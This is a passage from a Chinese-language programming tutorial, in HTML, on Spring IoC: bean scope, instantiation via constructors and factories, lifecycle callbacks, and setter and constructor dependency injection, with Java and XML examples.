class="hljs-string">&quot;prototype&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>但一般我们使用都是单一对象，因为方便进行快捷管理</p><p>但如果对象的状态经常变化，那我们就不能生成单一对象了，简单来说就不交给bean管理</p><p><img src="https://img-blog.csdnimg.cn/ce9544cba8c347488e1fad780266e630.png" alt="bean作用范围"></p><h4 id="1-4-2-bean实例化"><a href="#1-4-2-bean实例化" class="headerlink" title="1.4.2 bean实例化"></a>1.4.2 bean实例化</h4><p>1.构造方法</p><p>我们对于接口实例化建立构造方法的时候，构造方法是通过反射实现的（private也会调用）</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookDaoImpl</span> <span class="hljs-title">implements</span> <span class="hljs-title">BookDao</span> &#123;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">BookDaoImpl</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;book dao constructor is running ....&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">save</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;book dao save ...&quot;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//此时也能运行得到 book dao constructor is running ....</span><br></code></pre></td></tr></table></figure><p>但是如果加入了参数</p><p><code> pubilc BookDaoImpl(int i)</code>，就会报错</p><p>说明spring创建bean的时候调用的是无参的构造方法时</p><p>2.静态工厂实例化</p><p>工厂代码：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OrderDaoFactory</span> &#123;</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> OrderDao <span class="hljs-title">getOrderDao</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;factory setup....&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">OrderDaoImpl</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过工厂写bean：因为构造出来的是一个<code>factory</code>对象，我们要获得<code>OrderDao</code>对象就需要调用工厂中的<code>getOrderDao</code>方法</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">    <span class="hljs-comment">&lt;!--方式二：使用静态工厂实例化bean--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;orderDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.itheima.factory.OrderDaoFactory&quot;</span> <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;getOrderDao&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>这样运行得到的结果，既执行了dao的代码也执行了工厂中的代码</p><p>但是现在这种方式使用的不多了</p><p>3.实例工厂实例化</p><p>通过实例工厂建立对象</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//实例工厂创建对象</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserDaoFactory</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> UserDao getUserDao()&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-type">UserDaoImpl</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>bean中需要通过工厂对象再得到dao对象</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">    <span class="hljs-comment">&lt;!--方式三：使用实例工厂实例化bean--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userFactory&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.itheima.factory.UserDaoFactory&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--实例工厂获取对象，使用factory-bean获取工厂对象 factory-method获取工厂中创建对象的方法--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;getUserDao&quot;</span> <span class="hljs-attr">factory-bean</span>=<span class="hljs-string">&quot;userFactory&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>但是我们发现工厂对象创建出来没有用处，只是为了单纯的得到dao对象而放入bean中</p><p>4.通过factoryBean泛型实例化</p><p>实际上是对第4种方式的优化</p><p>在这个UserDaoFactoryBean中实现这个泛型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//FactoryBean创建对象</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserDaoFactoryBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">FactoryBean</span>&lt;<span class="hljs-title">UserDao</span>&gt; </span>&#123;<br>    <span class="hljs-comment">//代替原始实例工厂中创建对象的方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> UserDao <span class="hljs-title">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> UserDaoImpl();<br>    &#125;<br><span class="hljs-comment">//写出返回类型</span><br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; getObjectType() &#123;<br>        <span class="hljs-keyword">return</span> UserDao.class;<br>    &#125;<br>    <br>    <span class="hljs-comment">//设置是否单例，默认为单例，return false关闭单例</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isSingleton</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>然后在bean中，我们的代码得到了简化</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--方式四：使用FactoryBean实例化bean--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.itheima.factory.UserDaoFactoryBean&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><h4 id="1-4-3-bean的生命周期"><a href="#1-4-3-bean的生命周期" class="headerlink" title="1.4.3 bean的生命周期"></a>1.4.3 bean的生命周期</h4><p>在dao中写两个方法代表初始化和销毁</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookDaoImpl</span> <span class="hljs-title">implements</span> <span class="hljs-title">BookDao</span> &#123;</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">save</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;book dao save ...&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//表示bean初始化对应的操作</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;init...&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//表示bean销毁前对应的操作</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destory</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;destory...&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>但是现在这两个方法不会执行，所以我们需要在IoC中配置一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--init-method：设置bean初始化生命周期回调函数--&gt;</span><br><span class="hljs-comment">&lt;!--destroy-method：设置bean销毁生命周期回调函数，仅适用于单例对象--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;init&quot;</span> <span class="hljs-attr">destroy-method</span>=<span class="hljs-string">&quot;destory&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>在主函数中初始化和销毁（close），但是<code>ApplicationContext</code>没有close方法，只有它的子类<code>ClassPathXmlApplicationContext</code>有close方法，所以我们使用<code>ClassPathXmlApplicationContext</code>，构建ctx</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">( <span class="hljs-keyword">String</span>[] args )</span> </span>&#123;<br>    ClassPathXmlApplicationContext ctx = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;applicationContext.xml&quot;</span>);<br><br>    BookDao bookDao = (BookDao) ctx.<span class="hljs-built_in">getBean</span>(<span class="hljs-string">&quot;bookDao&quot;</span>);<br>    bookDao.<span class="hljs-built_in">save</span>();<br>    <span class="hljs-comment">//注册关闭钩子函数，在虚拟机退出之前回调此函数，关闭容器</span><br>    <span class="hljs-comment">//ctx.registerShutdownHook();</span><br>    <span class="hljs-comment">//关闭容器</span><br>    ctx.<span class="hljs-built_in">close</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>除了使用close方法，我们还可以注册钩子函数</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>注册关闭钩子函数，在虚拟机退出之前回调此函数，关闭容器<br>ctx.registerShutdownHook();<br></code></pre></td></tr></table></figure><p>也可以达到触达<code>destroy</code>的效果</p><p>还可以使用接口控制，我们这里拿service举例，直接<code>implements</code>两个接口，两个接口各对应了一个方法</p><p>但是时间顺序：<strong>setBookDao&gt;afterPropertiesSet</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookServiceImpl</span> <span class="hljs-title">implements</span> <span class="hljs-title">BookService</span>, <span class="hljs-title">InitializingBean</span>, <span class="hljs-title">DisposableBean</span> &#123;</span><br>    <span class="hljs-keyword">private</span> BookDao bookDao;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setBookDao</span><span class="hljs-params">(BookDao bookDao)</span> </span>&#123;<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;set .....&quot;</span>);<br>        <span class="hljs-keyword">this</span>.bookDao = bookDao;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">save</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;book service save ...&quot;</span>);<br>        bookDao.<span class="hljs-built_in">save</span>();<br>    &#125;<br><br><span class="hljs-comment">//destroy</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> throws Exception </span>&#123;<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;service destroy&quot;</span>);<br>    &#125;<br><br><span class="hljs-comment">///init</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterPropertiesSet</span><span class="hljs-params">()</span> throws Exception </span>&#123;<br>        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;service init&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>关于bean的生命周期我们还要了解</p><p>第一步是相当于new对象，然后执行构造方法</p><p>set操作在init之前，也就是依赖注入等在init之前就触发的原因</p><p>初始化容器部分，是一个一个bean执行的，也就是上一个bean的初始化方法执行完之后下一个bean才开始内存分配</p><p><img src="https://img-blog.csdnimg.cn/1f42e7dd06094ac985d68741ff4ce196.png" alt="bean的生命周期"></p><h4 id="1-4-4-setter注入"><a href="#1-4-4-setter注入" class="headerlink" title="1.4.4 setter注入"></a>1.4.4 setter注入</h4><p>我们在前面了解了bean setter注入的一种方式，引用注入</p><p>对引用数据类型使用</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">//6.提供对应的set方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">setBookDao</span>(<span class="hljs-params">BookDao bookDao</span>)</span> &#123;<br>    <span class="hljs-built_in">this</span>.bookDao = bookDao;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--注入引用类型--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookService&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.itheima.service.impl.BookServiceImpl&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--property标签：设置注入属性--&gt;</span><br>    <span class="hljs-comment">&lt;!--name属性：设置注入的属性名，实际是set方法对应的名称--&gt;</span><br>    <span class="hljs-comment">&lt;!--ref属性：设置注入引用类型bean的id或name--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;bookDao&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;userDao&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><p>现在我们学习另外的方式</p><p>如果我们要加入bean的数据是这样：<strong>还拥有两个属性</strong>，并提供可访问的set方法</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookDaoImpl</span> <span class="hljs-title">implements</span> <span class="hljs-title">BookDao</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">String</span> databaseName;<br>    <span class="hljs-keyword">private</span> int connectionNum;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-title">BookDaoImpl</span>(<span class="hljs-params"></span>)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">setConnectionNum</span>(<span class="hljs-params">int connectionNum</span>)</span> &#123;<br>        <span class="hljs-built_in">this</span>.connectionNum = connectionNum;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">setDatabaseName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> databaseName</span>)</span> &#123;<br>        <span class="hljs-built_in">this</span>.databaseName = databaseName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">save</span>(<span class="hljs-params"></span>)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;book dao save ...&quot;</span> + <span class="hljs-built_in">this</span>.databaseName + <span class="hljs-string">&quot;,&quot;</span> + <span class="hljs-built_in">this</span>.connectionNum);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们就需要引入这两个属性—注入我们的简单类型，对于基本数据类型的注入，我们使用<code>value</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--注入简单类型--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--property标签：设置注入属性--&gt;</span><br>    <span class="hljs-comment">&lt;!--name属性：设置注入的属性名，实际是set方法对应的名称--&gt;</span><br>    <span class="hljs-comment">&lt;!--value属性：设置注入简单类型数据值--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;connectionNum&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;100&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;databaseName&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;mysql&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="1-4-5-构造器注入"><a href="#1-4-5-构造器注入" class="headerlink" title="1.4.5 构造器注入"></a>1.4.5 构造器注入</h4><p>我们注入依赖还可以使用构造器注入</p><p>我们之前使用的是set方法引用注入，现在将set方法转换成构造方法</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">//引用数据类型</span><br><span class="hljs-keyword">private</span> BookDao bookDao;<br><span class="hljs-keyword">private</span> UserDao userDao;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BookServiceImpl</span><span class="hljs-params">(BookDao bookDao, UserDao userDao)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>.bookDao = bookDao;<br>    <span class="hljs-keyword">this</span>.userDao = userDao;<br>&#125;<br><br><span class="hljs-comment">//基本数据类型</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span> databaseName;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> connectionNum;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BookDaoImpl</span><span class="hljs-params">(<span class="hljs-keyword">String</span> databaseName, <span class="hljs-keyword">int</span> connectionNum)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>.databaseName = databaseName;<br>    <span class="hljs-keyword">this</span>.connectionNum = connectionNum;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们的<code>bean</code>配置中，不再使用<code>property</code>，而是使用<code>constructor-arg</code>标记，<strong>name和传入的形参名相同</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs applescript">标准书写<br>&lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span>&gt;<br>    &lt;constructor-arg <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;connectionNum&quot;</span> value=<span class="hljs-string">&quot;10&quot;</span>/&gt;<br>    &lt;constructor-arg <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;databaseName&quot;</span> value=<span class="hljs-string">&quot;mysql&quot;</span>/&gt;<br>&lt;/bean&gt;<br>&lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.UserDaoImpl&quot;</span>/&gt;<br><br>&lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;bookService&quot;</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;com.itheima.service.impl.BookServiceImpl&quot;</span>&gt;<br>    &lt;constructor-arg <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-keyword">ref</span>=<span class="hljs-string">&quot;userDao&quot;</span>/&gt;<br>    &lt;constructor-arg <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-keyword">ref</span>=<span class="hljs-string">&quot;bookDao&quot;</span>/&gt;<br>&lt;/bean&gt;<br></code></pre></td></tr></table></figure><p>但是这样使用变量名耦合度很高，所以提供了两种解决方法</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs applescript">使用变量类型作为标识，解决形参名称的问题，与形参名不耦合<br>&lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span>&gt;<br>    &lt;constructor-arg type=<span class="hljs-string">&quot;int&quot;</span> value=<span class="hljs-string">&quot;10&quot;</span>/&gt;<br>    &lt;constructor-arg type=<span class="hljs-string">&quot;java.lang.String&quot;</span> value=<span class="hljs-string">&quot;mysql&quot;</span>/&gt;<br>&lt;/bean&gt;<br>&lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.UserDaoImpl&quot;</span>/&gt;<br><br>&lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;bookService&quot;</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;com.itheima.service.impl.BookServiceImpl&quot;</span>&gt;<br>    &lt;constructor-arg <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-keyword">ref</span>=<span class="hljs-string">&quot;userDao&quot;</span>/&gt;<br>    &lt;constructor-arg <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-keyword">ref</span>=<span class="hljs-string">&quot;bookDao&quot;</span>/&gt;<br>&lt;/bean&gt;<br><br>使用index标记形参传入时的位置<br>&lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span>&gt;<br>    &lt;constructor-arg index=<span class="hljs-string">&quot;0&quot;</span> value=<span class="hljs-string">&quot;mysql&quot;</span>/&gt;<br>    &lt;constructor-arg index=<span class="hljs-string">&quot;1&quot;</span> value=<span class="hljs-string">&quot;100&quot;</span>/&gt;<br>&lt;/bean&gt;<br>&lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.UserDaoImpl&quot;</span>/&gt;<br><br>&lt;bean <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;bookService&quot;</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;com.itheima.service.impl.BookServiceImpl&quot;</span>&gt;<br>    &lt;constructor-arg <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-keyword">ref</span>=<span class="hljs-string">&quot;userDao&quot;</span>/&gt;<br>    &lt;constructor-arg <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;bookDao&quot;</span> <span class="hljs-keyword">ref</span>=<span class="hljs-string">&quot;bookDao&quot;</span>/&gt;<br>&lt;/bean&gt;<br></code></pre></td></tr></table></figure><p>对于这两种构造方法如何选择：</p><p><img src="https://img-blog.csdnimg.cn/5bf8dff7948c420c8959025640b49117.png" alt="注入方法选择"></p><h4 id="1-4-6-依赖自动装配"><a href="#1-4-6-依赖自动装配" class="headerlink" title="1.4.6 依赖自动装配"></a>1.4.6 依赖自动装配</h4><p>spring为我们提供了自动装配方案</p><p>使用bean中的autowire属性</p><p>1.根据类型，接口类型（推荐）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;bean <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;com.itheima.dao.impl.BookDaoImpl&quot;</span>/&gt;<br><br>&lt;bean <span class="hljs-attribute">id</span>=<span 